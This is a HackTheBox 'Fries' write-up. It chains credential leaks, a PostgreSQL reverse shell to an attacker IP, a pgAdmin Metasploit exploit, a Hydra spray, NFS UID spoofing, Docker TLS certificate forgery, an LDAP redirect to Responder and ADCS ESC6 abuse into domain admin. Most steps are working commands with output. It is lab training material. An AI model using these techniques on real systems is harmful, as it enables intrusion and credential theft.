# 🍟 HackTheBox — Fries (Hard)

![Difficulty](https://img.shields.io/badge/Difficulty-Hard-red)
![OS](https://img.shields.io/badge/OS-Windows%20%2B%20Linux-blue)
![Status](https://img.shields.io/badge/Status-Rooted-brightgreen)
![Platform](https://img.shields.io/badge/Platform-HackTheBox-green)

---

## ⚠️ Disclaimer
This writeup is for **educational purposes only** and was performed in an authorized HackTheBox environment.

---

## 🎯 Target Info

| Field | Value |
|-------|-------|
| Machine | Fries |
| Difficulty | Hard 🔴 |
| OS | Hybrid — Linux + Windows AD |
| Domain | fries.htb |
| DC Hostname | dc01.fries.htb |
| Status | ✅ Rooted |

---

## ⛓️ Attack Chain Overview

```
Port Scan → Subdomain Discovery (FFUF) → Gitea Creds Leak → PgAdmin Login
→ PostgreSQL RCE → CVE-2025-2945 Meterpreter → Env Password Reuse
→ SSH as svc → NFS Weak Export → Docker TLS CA Abuse
→ LDAP Redirect (Responder) → svc_infra Cleartext Creds
→ BloodHound → ReadMSAPassword → gMSA Hash Dump
→ ADCS ESC6 + ESC16 → Cert Abuse → Administrator Hash → Domain Admin
```

---

## 📑 Table of Contents

1. [Port Scanning](#1-port-scanning)
2. [Host Mapping](#2-host-mapping)
3. [Initial Credentials](#3-initial-credentials)
4. [Subdomain Discovery](#4-subdomain-discovery-ffuf)
5. [Gitea Recon → DB Creds](#5-gitea-recon--database-credentials)
6. [PgAdmin Access → RCE](#6-pgadmin-access--postgresql-rce)
7. [CVE-2025-2945 Meterpreter](#7-cve-2025-2945--pgadmin-authenticated-rce)
8. [Password Reuse → SSH](#8-password-reuse--ssh-as-svc)
9. [NFS Weak Export → Docker TLS](#9-nfs-weak-export--docker-tls-ca-abuse)
10. [LDAP Credential Capture](#10-ldap-credential-capture--svc_infra)
11. [BloodHound → gMSA](#11-bloodhound--readmsapassword--gmsa)
12. [ADCS ESC6 → Domain Admin](#12-adcs-esc6--domain-admin)
13. [Flags](#-flags)

---

## 1. Port Scanning

### Full Port Scan
```bash
nmap -sS -p- --min-rate 10000 10.129.244.72 -oN nmap_initial.txt
```

### Service Version Scan
```bash
nmap -sC -sV -p 22,53,80,88,135,139,389,443,445,464,593,636,3268,3269,5985 10.129.244.72
```

**Output:**
```
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          nginx 1.18.0 (Ubuntu)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fries.htb)
443/tcp   open  ssl/http      nginx 1.18.0 (Ubuntu)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
Service Info: Host: DC01; OSs: Linux, Windows; Domain: fries.htb
```

> **Why:** Port 22 (SSH on Linux), standard AD ports (88, 389, 445, 5985), and web services on 80/443 confirm a **hybrid environment** — Linux web host proxying to a Windows DC.

---

## 2. Host Mapping

```bash
echo "10.129.244.72 fries.htb dc01.fries.htb code.fries.htb db-mgmt05.fries.htb" | sudo tee -a /etc/hosts
```

---

## 3. Initial Credentials

HTB provided starting credentials:

```
User: d.cooper@fries.htb
Pass: D4LE11maan!!
```

> ⚠️ These fail for SSH, SMB, WinRM — only valid for web applications.

---

## 4. Subdomain Discovery (FFUF)

```bash
ffuf -c -u "http://fries.htb" -H "Host: FUZZ.fries.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs 154
```

**Output:**

![FFUF Subdomain Discovery](images/01_ffuf_subdomain.png)

```
code    [Status: 200, Size: 13591, Words: 1048, Lines: 272, Duration: 557ms]
```

> **Why:** `-fs 154` filters out default nginx responses (154 bytes). Discovered `code.fries.htb` — a **Gitea** instance.

---

## 5. Gitea Recon → Database Credentials

Browse to `http://code.fries.htb` → login with HTB creds:

![Gitea Login](images/02_gitea_repo.png)

```bash
git clone http://code.fries.htb/dale/fries.htb.git
cd fries.htb
git log -p --all | grep -i "password\|secret\|DATABASE\|KEY\|token\|passwd" | head -50
```

**Output:**

![Git History Creds](images/03_git_log_creds.png)

```
DATABASE_URL=postgresql://root:PsqLR00tpaSS11@172.18.0.3:5432/ps_db
SECRET_KEY=y0st528wn1idjk3b9a
```

> **Why:** `git log -p --all` shows ALL changes including deleted lines — developers often commit credentials then try to delete them, but git history keeps everything.

The README also mentions: `http://db-mgmt05.fries.htb` — a pgAdmin interface.

---

## 6. PgAdmin Access → PostgreSQL RCE

### Login to pgAdmin

Browse to `http://db-mgmt05.fries.htb`

![PgAdmin Login](images/04_pgadmin_login.png)

```
Username: d.cooper@fries.htb
Password: D4LE11maan!!
```

### pgAdmin Version

![PgAdmin Version](images/05_pgadmin_version.png)

> pgAdmin version **9.1.0** — vulnerable to CVE-2025-2945.

### Connect to PostgreSQL Server

In pgAdmin → Object → Register → Server:

![Register Server](images/06_pgadmin_register_server.png)

```
Host: 172.18.0.3
Port: 5432
Database: ps_db
Username: root
Password: PsqLR00tpaSS11
```

![Server Connection Details](images/07_pgadmin_connection.png)

### Test RCE — Directory Listing

```sql
SELECT pg_ls_dir('/');
```

![pg_ls_dir Output](images/08_pg_ls_dir.png)

### Read /etc/passwd

```sql
SELECT pg_read_file('/etc/passwd');
```

![pg_read_file Output](images/09_pg_read_passwd.png)

### Check Current User

```sql
CREATE TABLE IF NOT EXISTS cmd_test(result text);
COPY cmd_test FROM PROGRAM 'id';
SELECT * FROM cmd_test;
```

**Output:**
```
uid=999(postgres) gid=999(postgres) groups=999(postgres),101(ssl-cert)
```

### Reverse Shell

Start listener on Kali:
```bash
nc -lvnp 4444
```

Execute in pgAdmin Query Tool:

![Reverse Shell Query](images/10_reverse_shell_query.png)

```sql
CREATE TABLE IF NOT EXISTS cmd_test(result text);
COPY cmd_test FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.14.66/4444 0>&1"';
SELECT * FROM cmd_test;
```

**Shell received:**
```
postgres@858fdf51af59:~/data$ whoami
postgres
```

### Stabilize Shell

```bash
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows 40 columns 200
```

---

## 7. CVE-2025-2945 — pgAdmin Authenticated RCE

pgAdmin 9.1.0 is vulnerable to **CVE-2025-2945** — authenticated RCE via Python `eval()` in the query tool.

### Metasploit Module

![MSF Search pgAdmin](images/11_msf_search_pgadmin.png)

```bash
msfconsole -q
msf > use exploit/multi/http/pgadmin_query_tool_authenticated
```

![MSF Options Set](images/12_msf_options.png)

```
msf > set USERNAME d.cooper@fries.htb
msf > set PASSWORD D4LE11maan!!
msf > set DB_USER root
msf > set DB_PASS PsqLR00tpaSS11
msf > set DB_NAME ps_db
msf > set RHOSTS db-mgmt05.fries.htb
msf > set VHOST db-mgmt05.fries.htb
msf > set LHOST 10.10.14.66
msf > run
```

**Output:**

![Meterpreter Session](images/13_meterpreter_session.png)

```
[*] Started reverse TCP handler on 10.10.14.66:4444
[+] The target appears to be vulnerable. pgAdmin version 9.1.0 is affected
[+] Successfully authenticated to pgAdmin
[*] Meterpreter session 1 opened

meterpreter > getuid
Server username: pgadmin
```

---

## 8. Password Reuse → SSH as svc

Inside the pgAdmin container, dump environment variables:

```bash
cat /proc/self/environ | tr '\0' '\n'
```

![Environment Variables](images/14_env_vars.png)

```
PGADMIN_DEFAULT_EMAIL=admin@fries.htb
PGADMIN_DEFAULT_PASSWORD=Friesf00Ds2025!!
SECRET_KEY=1Mmv-sf5sOkJWFFATAIjb4zix4-_WI6Y9r_rA3cfZf0=
```

> **Why:** Container environment variables store application secrets. This password may be reused on SSH.

### Hydra SSH Brute Force

```bash
hydra -L users.txt -p 'Friesf00Ds2025!!' ssh://10.129.244.72 -t 64 -I
```

**Output:**

![Hydra SSH](images/15_hydra_ssh.png)

```
[22][ssh] host: 10.129.244.72   login: svc   password: Friesf00Ds2025!!
1 of 1 target successfully completed
```

```bash
ssh svc@10.129.244.72
svc@web:~$ whoami
svc
```

---

## 9. NFS Weak Export → Docker TLS CA Abuse

### Check NFS Exports

```bash
svc@web:~$ showmount -e
```

```
Export list for web:
/srv/web.fries.htb *
```

```bash
ls -la /srv/web.fries.htb
```

```
drwxrwx--- 2 root infra managers 4096 May 26 2025 certs
drwxrwxrwx 2 root root           4096 May 31 2025 shared
drwxr----- 5 svc  svc            4096 Jun  7 2025 webroot
```

> **Why:** NFS export is wildcard `*` with **no_root_squash** disabled — we can mount as any UID including root.

### Setup Tunnel + NFS Tools

```bash
# Pivot into internal network
sshuttle -r svc@10.129.244.72 -N

# Install NFS security tooling
pipx install git+https://github.com/hvs-consulting/nfs-security-tooling.git

# Analyze NFS export
nfs_analyze 192.168.100.2 --check-no-root-squash
```

**Key output:**
```
no_root_squash: DISABLED  ← VULNERABLE!

Escape successful, root directory listing:
lib64 mnt sys etc proc lib snap lost+found...

Content of /etc/shadow:
root:$y$j9T$yqbmFwMbHh7qoaRaY3jx..$FMFv9upB...
svc:$y$j9T$Y7j3MSqEJTcNTqSSVJRS2.$h0AFlCXKB9...
```

### Mount NFS and Steal Docker TLS Certs

```bash
mkdir /tmp/nfs_mount
fuse_nfs --export /srv/web.fries.htb --fake-uid --allow-write /tmp/nfs_mount 192.168.100.2

ls -la /tmp/nfs_mount/certs
```

```
-rw-r--r-- 1 root 59605603 1708 Apr 27 2026 ca-key.pem   ← CA private key!
-rw-r--r-- 1 root 59605603 1111 Apr 27 2026 ca.pem
-rw-r--r-- 1 root 59605603 1115 Apr 27 2026 server-cert.pem
-rw-r--r-- 1 root 59605603 1704 Apr 27 2026 server-key.pem
```

```bash
cp /tmp/nfs_mount/certs/* ~/AD-PROJECT/fries/
```

### Forge Root Certificate & Access Docker

```bash
# Tunnel Docker port
ssh svc@10.129.244.72 -L 2376:127.0.0.1:2376 -N &

# Generate root cert signed by stolen CA
openssl genrsa -out root-key.pem 4096
openssl req -new -key root-key.pem -out root.csr -subj "/CN=root"
openssl x509 -req -in root.csr \
  -CA ca.pem -CAkey ca-key.pem \
  -CAcreateserial \
  -out root-cert.pem -days 365
```

```
Certificate request self-signature ok
subject=CN=root
```

```bash
# List all containers
docker --tlsverify \
  --tlscacert=ca.pem \
  --tlscert=root-cert.pem \
  --tlskey=root-key.pem \
  -H=tcp://127.0.0.1:2376 ps
```

**Output:**
```
CONTAINER ID   IMAGE                   NAMES
f427ecaa3bdd   pwm/pwm-webapp:latest   pwm
cb46692a4590   dpage/pgadmin4:9.1.0    pgadmin4
bfe752a26695   fries-web               web
858fdf51af59   postgres:16             postgres
b916aad508e2   gitea/gitea:1.22.6      gitea
```

> **Why:** Docker TLS authenticates by certificate CN. Forging a cert with `CN=root` signed by the stolen CA gives full Docker API access.

### Enter PWM Container

```bash
docker --tlsverify \
  --tlscacert=ca.pem \
  --tlscert=root-cert.pem \
  --tlskey=root-key.pem \
  -H=tcp://127.0.0.1:2376 exec -it f427ecaa3bdd /bin/bash

root@f427ecaa3bdd:/# whoami
root
```

---

## 10. LDAP Credential Capture → svc_infra

### Inspect PWM Configuration

```bash
cat /config/PwmConfiguration.xml | grep "ldap"
```

**Key finding:**
```xml
<value>ldaps://dc01.fries.htb:636</value>
<value>{"type":"ldapUser","ldapBase":"CN=svc_infra,CN=Users,DC=fries,DC=htb"}</value>
```

> **Why:** PWM uses `svc_infra` to bind to LDAP. Redirecting to our Responder will capture plaintext creds.

### Redirect LDAP to Attacker

Inside the PWM container:
```bash
sed -i 's|ldaps://dc01.fries.htb:636|ldap://10.10.14.66:389|' /config/PwmConfiguration.xml
```

### Start Responder

```bash
sudo responder -I tun0 -wdv
```

**Captured credentials:**

![Responder LDAP Capture](images/16_responder_ldap.png)

```
[LDAP] Cleartext Client   : 10.129.244.72
[LDAP] Cleartext Username : CN=svc_infra,CN=Users,DC=fries,DC=htb
[LDAP] Cleartext Password : m6tneOMAh5p0wQ0d
```

### Validate

```bash
netexec ldap 10.129.244.72 -u svc_infra -p 'm6tneOMAh5p0wQ0d'
# [+] fries.htb\svc_infra:m6tneOMAh5p0wQ0d ✅
```

---

## 11. BloodHound → ReadMSAPassword → gMSA

### Collect BloodHound Data

```bash
bloodhound-ce-python -d 'fries.htb' -u 'svc_infra' -p 'm6tneOMAh5p0wQ0d' \
  -ns 10.129.244.72 -c All --zip
```

> **BloodHound shows:** `svc_infra` → **ReadMSAPassword** → `gMSA_CA_prod$`

### Dump gMSA Password Hash

```bash
python gMSADumper.py -u 'svc_infra' -p 'm6tneOMAh5p0wQ0d' -d 'fries.htb'
```

**Output:**

![gMSADumper Output](images/17_gmsa_dumper.png)

```
Users or groups who can read password for gMSA_CA_prod$:
 > svc_infra
gMSA_CA_prod$:::f6118585da63c6810f795676f8ddc87d
gMSA_CA_prod$:aes256-cts-hmac-sha1-96:e88d13f5ef571d98587c27c52522f162239e9182...
```

> **Why:** gMSA passwords are stored in AD and retrievable by authorized principals — no cracking needed, we get the NT hash directly.

### WinRM as gMSA

```bash
evil-winrm -i fries.htb -u 'gMSA_CA_prod$' -H 'f6118585da63c6810f795676f8ddc87d'
```

```
*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Documents> whoami
fries\gmsa_ca_prod$
```

---

## 12. ADCS ESC6 → Domain Admin

### Enumerate CA Permissions

```powershell
.\Certify.exe cas
```

**Key findings:**
```
Enterprise CA Name : fries-DC01-CA
Allow  ManageCA, Enroll   FRIES\gMSA_CA_prod$  ← we have ManageCA!
```

### Enable EDITF_ATTRIBUTESUBJECTALTNAME2 (ESC6)

```powershell
$CA = New-Object -ComObject CertificateAuthority.Admin
$Config = "DC01.fries.htb\fries-DC01-CA"
$current = 1114446
$new = $current -bor 262144   # Enable EDITF_ATTRIBUTESUBJECTALTNAME2

$CA.SetConfigEntry(
    $Config,
    "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy",
    "EditFlags",
    $new
)
Restart-Service certsvc -Force
```

### Verify Flag is Set

```powershell
certutil -config "DC01.fries.htb\fries-DC01-CA" -getreg policy\EditFlags
```

**Output:**

![EditFlags Verified](images/18_editflags_verified.png)

```
EditFlags REG_DWORD = 15014e (1376590)
    EDITF_ATTRIBUTESUBJECTALTNAME2 -- 40000 (262144)  ← SET! ✅
```

### Request Certificate as Administrator

```bash
# Sync time first (required for Kerberos)
sudo ntpdate fries.htb

certipy-ad req -u 'svc_infra@fries.htb' -p 'm6tneOMAh5p0wQ0d' \
  -dc-ip 10.129.244.72 \
  -ca 'fries-DC01-CA' \
  -template User \
  -upn 'administrator@fries.htb'
```

**Output:**
```
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@fries.htb'
[*] Saved to 'administrator.pfx'
```

### Authenticate → Get Administrator Hash

```bash
certipy-ad auth -pfx administrator.pfx \
  -dc-ip 10.129.244.72 \
  -domain fries.htb \
  -username administrator
```

**Output:**
```
[*] Got TGT
[*] Got hash for 'administrator@fries.htb':
    aad3b435b51404eeaad3b435b51404ee:a773cb05d79273299a684a23ede56748
```

> **Why:** PKINIT allows certificate-based Kerberos auth. Certipy extracts the NT hash from the TGT PAC.

### Pass the Hash → Domain Admin

```bash
evil-winrm -i 10.129.244.72 -u 'Administrator' -H 'a773cb05d79273299a684a23ede56748'
```

```
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

---

## 🏁 Flags

```powershell
cd C:\Users\Administrator\Desktop
type user.txt
type root.txt
```

**Output:**

![Flags](images/19_flags.png)

```
user.txt: 20040e0a3b5b9e663a33580d791615a1
root.txt: 1b7444a4d4e9cfc99ce22ef1e1e4b7e5
```

---

## 📊 Vulnerability Summary

| # | Vulnerability | Impact |
|---|---------------|--------|
| 1 | Gitea commit history — DB creds exposed | PostgreSQL access |
| 2 | PostgreSQL COPY FROM PROGRAM (RCE) | Shell as postgres |
| 3 | CVE-2025-2945 — pgAdmin authenticated RCE | Shell as pgadmin |
| 4 | Container env var password reuse | SSH as svc |
| 5 | NFS no_root_squash + wildcard export | Docker TLS cert theft |
| 6 | Docker TLS CA key exposed via NFS | Full Docker API access |
| 7 | PWM LDAP redirect → Responder capture | Cleartext svc_infra creds |
| 8 | ReadMSAPassword on gMSA_CA_prod$ | gMSA NT hash |
| 9 | ADCS ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2) | Certificate as Administrator |
| 10 | PKINIT certificate authentication | Administrator NT hash → DA |

---

## 🛠️ Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning |
| `ffuf` | Subdomain enumeration |
| `git` | Repository credential extraction |
| `msfconsole` | CVE-2025-2945 exploitation |
| `hydra` | SSH password spray |
| `sshuttle` | Network pivoting |
| `nfs_analyze` / `fuse_nfs` | NFS UID spoofing |
| `openssl` | Docker TLS cert forgery |
| `docker` | Container access |
| `responder` | LDAP cleartext capture |
| `bloodhound-ce-python` | AD enumeration |
| `gMSADumper` | gMSA password extraction |
| `evil-winrm` | WinRM shell |
| `Certify.exe` | ADCS enumeration |
| `certipy-ad` | Certificate request & auth |
| `ntpdate` | Kerberos time sync |

---

*Writeup by shubham | HTB Fries — Hard | Rooted ✅*
